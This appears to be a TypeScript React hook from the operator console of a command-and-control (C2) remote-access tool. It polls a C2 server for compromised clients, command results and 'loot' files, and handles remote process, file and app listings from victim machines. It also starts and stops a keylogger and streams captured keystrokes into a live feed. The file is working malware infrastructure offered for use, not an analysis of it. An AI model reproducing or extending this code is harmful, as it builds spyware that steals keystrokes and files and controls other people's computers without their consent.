import { useEffect, useRef, useState, useCallback } from 'react';
import { invoke } from '@tauri-apps/api/core';
import type { Client, CommandLog, LootFile, PreviewData, InstalledApp } from '../types';

interface UseC2PollingOpts {
  activeTab: string;
  isFilesLoading: boolean;
  selectedClientId: string;
  c2Mode: 'cloud' | 'local';
  c2ServerUrl: string;
  authHeader: Record<string, string>;
  operatorToken: string;
  setClients: (v: Client[]) => void;
  setLogs: (v: CommandLog[]) => void;
  setLootFiles: (v: LootFile[]) => void;
  setProcessList: (v: any) => void;
  setIsProcessesLoading: (v: boolean) => void;
  setPreviewOpen: (v: boolean) => void;
  setPreviewData: (v: PreviewData | null) => void;
  setIsPreviewLoading: (v: boolean) => void;
  setAppsList: (v: InstalledApp[]) => void;
  setIsAppsLoading: (v: boolean) => void;
  mergeAppIcons: (icons: Record<string, string>) => void;
  parseFileList: (output: string) => void;
  appendTermLog: (lines: string[]) => void;
  appendKeylogChunk: (chunk: string) => void;
  setIsKeylogStreaming: (v: boolean) => void;
  setC2ConnectionStatus: (s: 'connected' | 'connecting' | 'error') => void;
  showToast: (msg: string) => void;
}

export function useC2Polling(opts: UseC2PollingOpts) {
  const {
    activeTab, isFilesLoading, selectedClientId, c2Mode, c2ServerUrl, authHeader, operatorToken,
    setClients, setLogs, setLootFiles,
    setProcessList, setIsProcessesLoading,
    setPreviewOpen, setPreviewData, setIsPreviewLoading,
    setAppsList, setIsAppsLoading, mergeAppIcons,
    parseFileList, appendTermLog,
    appendKeylogChunk, setIsKeylogStreaming,
    setC2ConnectionStatus, showToast,
  } = opts;

  const logsRef = useRef<CommandLog[]>([]);
  const printedIdsRef = useRef<Set<number>>(new Set());
  const hadErrorRef = useRef(false);
  // Highest log id seen via any channel — used as the SSE ?since= cursor
  const lastLogIdRef = useRef(0);
  // Mirrors executeCommand's target fallback; read by the SSE handler between polls
  const targetRef = useRef('');
  // True while the SSE stream is connected — polling drops to a slow safety net
  const [sseLive, setSseLive] = useState(false);

  // Cap printedIds to avoid unbounded growth
  const MAX_PRINTED = 1000;

  const trackId = useCallback((id: number) => {
    printedIdsRef.current.add(id);
    if (printedIdsRef.current.size > MAX_PRINTED) {
      const arr = Array.from(printedIdsRef.current);
      printedIdsRef.current = new Set(arr.slice(-MAX_PRINTED));
    }
  }, []);

  const noteLogId = useCallback((id: number) => {
    if (id > lastLogIdRef.current) lastLogIdRef.current = id;
  }, []);

  // Track PENDING logs that never get a SUCCESS — used for timeout error state
  const pendingTimeoutsRef = useRef<Map<number, ReturnType<typeof setTimeout>>>(new Map());
  // Single processing path shared by the polling fetch and SSE pushes
  const processLog = useCallback((log: CommandLog) => {
    const wasPending = pendingTimeoutsRef.current.has(log.id);
    // Allow PENDING -> SUCCESS reuse of same id (Tauri reuses the PENDING row and updates it to SUCCESS)
    // Previously we added PENDING ids to printedIds and then ignored the SUCCESS update - that left Apps Explorer stuck at skeleton
    if (!wasPending && printedIdsRef.current.has(log.id)) return;
    noteLogId(log.id);
    // If this PENDING eventually gets a SUCCESS, clear its timeout
    if (wasPending) {
      clearTimeout(pendingTimeoutsRef.current.get(log.id)!);
      pendingTimeoutsRef.current.delete(log.id);
    }
    // Only accept structured output from the currently targeted client —
    // another machine's ls/ps/preview must never hijack this operator's view
    const fromTarget = !targetRef.current || log.client_id === targetRef.current;

    if (log.output.includes('[JSON_PREVIEW]')) {
      trackId(log.id);
      if (!fromTarget) return;
      try {
        const parsed = JSON.parse(log.output.replace('[JSON_PREVIEW]', ''));
        // Surface every outcome — ok, error, unsupported — so the modal
        // never hangs on its loading spinner
        setPreviewData(parsed);
        setIsPreviewLoading(false);
        if (parsed.status === 'ok') setPreviewOpen(true);
      } catch {}
    } else if (log.output.includes('[JSON_APPS]')) {
      trackId(log.id);
      if (!fromTarget) return;
      try {
        const parsed = JSON.parse(log.output.replace('[JSON_APPS]', ''));
        setAppsList(parsed.items || []);
        setIsAppsLoading(false);
      } catch {
        setIsAppsLoading(false);
      }
    } else if (log.output.includes('[JSON_ICONS]')) {
      trackId(log.id);
      if (!fromTarget) return;
      try {
        const parsed = JSON.parse(log.output.replace('[JSON_ICONS]', ''));
        mergeAppIcons(parsed.icons || {});
      } catch {}
    } else if (log.output.includes('[JSON_PROCS]')) {
      trackId(log.id);
      if (!fromTarget) return;
      try {
        const procs = JSON.parse(log.output.replace('[JSON_PROCS]', ''));
        setProcessList(procs);
        setIsProcessesLoading(false);
      } catch {}
    } else if (log.output.includes('[JSON_FILES]')) {
      trackId(log.id);
      if (!fromTarget) return;
      parseFileList(log.output);
    } else if (log.output.startsWith('[KEYLOG DUMP')) {
      // Auto/manual keydump → keystroke feed, not the terminal echo
      trackId(log.id);
      if (!fromTarget) return;
      const nl = log.output.indexOf('\n');
      const body = nl >= 0 ? log.output.slice(nl + 1) : '';
      if (body.trim()) appendKeylogChunk(body.endsWith('\n') ? body : `${body}\n`);
    } else if (log.command === 'keystart' || log.command === 'keystop' || log.command === 'kill') {
      trackId(log.id);
      setIsKeylogStreaming(log.command === 'keystart');
      const cmdLabel = log.command;
      appendTermLog([`\n[${cmdLabel}] ${log.client_id}`, log.output]);
    } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
      trackId(log.id);
      const cmdLabel = log.command || 'Command';
      const isError = log.output.trim().startsWith('[-]') || log.output.includes('Failed') || log.output.includes('Error:');
      appendTermLog([`\n[${cmdLabel}] ${log.client_id}${isError ? ' — FAILED' : ''}`, log.output]);
      if (isError) showToast(`${cmdLabel} failed on ${log.client_id}`);
    } else if (log.status === 'PENDING' && log.output.startsWith('Queued')) {
      // Don't print PENDING noise — but arm a timeout. If no SUCCESS for this id in 30s,
      // the client is likely offline/slow and operator needs feedback + retry.
      // Do NOT trackId here - Tauri reuses this same id for the SUCCESS payload, so marking it printed would make the real result invisible (Apps Explorer stays 0)
      if (pendingTimeoutsRef.current.has(log.id)) return;
      const tid = setTimeout(() => {
        pendingTimeoutsRef.current.delete(log.id);
        // Only fire if this log is still pending (no SUCCESS seen)
        if (printedIdsRef.current.has(log.id)) return;
        const fromTargetNow = !targetRef.current || log.client_id === targetRef.current;
        if (!fromTargetNow) return;
        appendTermLog([
          `\n[${log.command}] ${log.client_id} — NO RESPONSE (30s)`,
          `[-] No result — client may be offline, sleeping, or rate-limited. Retry with: ${log.command}`,
        ]);
        showToast(`No response from ${log.client_id} — retry?`);
      }, 30000);
      pendingTimeoutsRef.current.set(log.id, tid);
    }
  }, [noteLogId, trackId, setPreviewData, setIsPreviewLoading, setPreviewOpen, setAppsList, setIsAppsLoading, mergeAppIcons, setProcessList, setIsProcessesLoading, parseFileList, appendTermLog, appendKeylogChunk, setIsKeylogStreaming]);

  useEffect(() => {
    // While SSE is live it delivers instantly; polling becomes a 10s safety net.
    const pollInterval = sseLive ? 10000 : (isFilesLoading ? 300 : 750);
    let cancelled = false;
    const abortControllers: AbortController[] = [];

    const fetchData = async () => {
      if (cancelled) return;
      // Drop refs to last cycle's controllers — they've settled; cleanup only needs the current ones
      abortControllers.length = 0;
      try {
        let backendClients: Client[] = [];
        let backendLogs: CommandLog[] = [];

        if (c2Mode === 'cloud' && c2ServerUrl) {
          const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
          const ac1 = new AbortController();
          const ac2 = new AbortController();
          abortControllers.push(ac1, ac2);
          try {
            const clientsRes = await fetch(`${cleanUrl}/api/clients`, { headers: authHeader, signal: ac1.signal });
            if (clientsRes.ok) {
              backendClients = await clientsRes.json();
              setC2ConnectionStatus('connected');
              hadErrorRef.current = false;
            } else {
              setC2ConnectionStatus('error');
              // Toast only on the transition into the error state — avoid spamming every poll
              if (!hadErrorRef.current) {
                let errMsg = `Server error: ${clientsRes.status}`;
                try { const body = await clientsRes.json(); if (body.error) errMsg = body.error; } catch {}
                showToast(`Auth failed: ${errMsg}`);
              }
              hadErrorRef.current = true;
            }
          } catch (e: any) {
            if (e?.name !== 'AbortError') {
              setC2ConnectionStatus('error');
              if (!hadErrorRef.current) showToast(`Connection failed: ${e}`);
              hadErrorRef.current = true;
              appendTermLog([`[-] C2 unreachable — retrying… (${e?.message || e})`]);
            }
          }
          try {
            const logsRes = await fetch(`${cleanUrl}/api/logs`, { headers: authHeader, signal: ac2.signal });
            if (logsRes.ok) backendLogs = await logsRes.json();
          } catch {}
        } else {
          try {
            backendClients = await invoke<Client[]>('get_clients');
            backendLogs = await invoke<CommandLog[]>('get_logs');
            setC2ConnectionStatus(backendClients.length ? 'connected' : 'connected');
            hadErrorRef.current = false;
          } catch (e: any) {
            setC2ConnectionStatus('error');
            if (!hadErrorRef.current) showToast(`Local C2 error: ${e}`);
            hadErrorRef.current = true;
            appendTermLog([`[-] Local C2 error — is Tauri sidecar running? (${e})`]);
          }
        }

        try {
          const loot = await invoke<LootFile[]>('get_loot');
          if (!cancelled) setLootFiles(loot);
        } catch {}

        if (cancelled) return;
        setClients(backendClients);
        setLogs(backendLogs);
        logsRef.current = backendLogs;

        // Mirror executeCommand's target fallback so we accept output from
        // whichever client commands are actually being sent to
        targetRef.current = selectedClientId && backendClients.some(c => c.id === selectedClientId)
          ? selectedClientId
          : (backendClients[0]?.id || '');

        // Server returns logs newest-first; process chronologically so older
        // stragglers can never overwrite newer responses in the UI
        [...backendLogs].reverse().forEach(processLog);
      } catch {}
    };

    fetchData();
    const interval = setInterval(fetchData, pollInterval);
    return () => {
      cancelled = true;
      clearInterval(interval);
      abortControllers.forEach(ac => ac.abort());
    };
  }, [activeTab, isFilesLoading, sseLive, selectedClientId, c2Mode, c2ServerUrl, authHeader, setC2ConnectionStatus, showToast, processLog, setClients, setLogs, setLootFiles]);

  // === SSE push stream (cloud mode) — instant results, no polling latency ===
  useEffect(() => {
    if (c2Mode !== 'cloud' || !c2ServerUrl || !operatorToken) return;
    const cleanUrl = c2ServerUrl.replace(/\/+$/, '');
    let es: EventSource | null = null;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let disposed = false;

    const connect = () => {
      if (disposed) return;
      const url = `${cleanUrl}/api/events?token=${encodeURIComponent(operatorToken)}&since=${lastLogIdRef.current}`;
      es = new EventSource(url);

      es.onopen = () => setSseLive(true);

      es.onmessage = (msg) => {
        try {
          const ev = JSON.parse(msg.data);
          if (ev.type === 'sync') {
            if (Array.isArray(ev.clients)) setClients(ev.clients);
            if (targetRef.current === '' && ev.clients?.[0]) targetRef.current = ev.clients[0].id;
            // Replay missed logs in chronological order
            (ev.replay || []).forEach((log: CommandLog) => processLog(log));
          } else if (ev.type === 'log') {
            if (ev.log) processLog(ev.log);
          } else if (ev.type === 'clients') {
            // Refetch just the client list — cheap, keeps one source of truth
            fetch(`${cleanUrl}/api/clients`, { headers: authHeader })
              .then(r => r.ok ? r.json() : null)
              .then(list => { if (list) setClients(list); })
              .catch(() => {});
          } else if (ev.type === 'loot') {
            invoke<LootFile[]>('get_loot').then(loot => setLootFiles(loot)).catch(() => {});
          }
        } catch {}
      };

      es.onerror = () => {
        setSseLive(false);
        es?.close();
        // EventSource auto-reconnect can loop fast on auth failures —
        // back off manually and let the polling safety net carry the UI
        if (!disposed) reconnectTimer = setTimeout(connect, 10000);
      };
    };

    connect();
    return () => {
      disposed = true;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      es?.close();
      setSseLive(false);
    };
  }, [c2Mode, c2ServerUrl, operatorToken, authHeader, processLog, setClients, setLootFiles]);

  return { sseLive };
}
